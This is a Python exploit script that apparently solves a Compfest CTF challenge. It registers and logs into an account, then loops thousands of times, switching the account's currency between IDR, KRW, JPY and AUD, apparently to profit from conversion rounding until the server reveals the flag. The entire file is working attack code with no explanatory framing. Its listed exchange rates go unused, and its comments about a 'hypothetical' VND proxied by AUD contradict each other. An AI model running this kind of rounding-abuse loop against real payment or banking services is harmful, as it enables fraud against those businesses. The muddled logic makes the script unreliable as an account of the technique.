import requests
import time

BASE_URL = "http://ctf.compfest.id:7303"
MAX_ITERATIONS = 10000  # Increased to ensure success

def exploit():
    # Generate random username
    timestamp = int(time.time())
    username = f"exploit_{timestamp}"
    password = "password123"
    
    # Create session
    s = requests.Session()
    
    # 1. Register account
    print(f"[*] Registering account {username}...")
    resp = s.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password,
        "confirm_password": password
    }, allow_redirects=False)
    
    if resp.status_code != 302:
        print("[-] Registration failed!")
        return
    
    # 2. Login
    print("[*] Logging in...")
    resp = s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    }, allow_redirects=False)
    
    if resp.status_code != 302:
        print("[-] Login failed!")
        return
    
    print("[+] Successfully logged in!")
    
    # 3. Set up conversion cycle
    conversion_cycle = [
        ("IDR", 10597.38),   # Indonesian Rupiah
        ("KRW", 888.04),     # South Korean Won
        ("JPY", 94.48),      # Japanese Yen
        ("VND", 1)           # Vietnamese Dong (hypothetical, use AUD as proxy)
    ]
    
    # Use AUD as proxy for VND since it's not available
    proxy_currency = "AUD"
    
    print("[*] Starting precision exploit...")
    for i in range(1, MAX_ITERATIONS + 1):
        try:
            # Convert through the cycle
            for currency, _ in conversion_cycle:
                if currency == "VND":
                    # Use AUD as proxy for VND
                    s.post(f"{BASE_URL}/change-currency", data={"currency": proxy_currency})
                else:
                    s.post(f"{BASE_URL}/change-currency", data={"currency": currency})
            
            # Check balance every 50 iterations
            if i % 50 == 0:
                print(f"[*] Completed {i} iterations...")
                resp = s.get(f"{BASE_URL}/are-you-rich")
                if "YES YOU ARE" in resp.text:
                    # Extract flag
                    if "FLAG{" in resp.text:
                        start = resp.text.find("FLAG{")
                        end = resp.text.find("}", start)
                        flag = resp.text[start:end+1]
                        print(f"[+] FLAG FOUND: {flag}")
                        return
                    else:
                        print("[+] Flag found in response!")
                        print(resp.text)
                        return
        except Exception as e:
            print(f"[-] Error on iteration {i}: {str(e)}")
            # Recover session by re-login
            s.post(f"{BASE_URL}/login", data={"username": username, "password": password})
    
    # Final check
    print("[*] Final balance check...")
    resp = s.get(f"{BASE_URL}/are-you-rich")
    if "YES YOU ARE" in resp.text:
        if "FLAG{" in resp.text:
            start = resp.text.find("FLAG{")
            end = resp.text.find("}", start)
            flag = resp.text[start:end+1]
            print(f"[+] FLAG FOUND: {flag}")
        else:
            print("[+] Flag found in response!")
            print(resp.text)
    else:
        print("[-] Exploit completed but balance not sufficient")
        print("[!] Try increasing MAX_ITERATIONS or using a different conversion sequence")

if __name__ == "__main__":
    exploit()
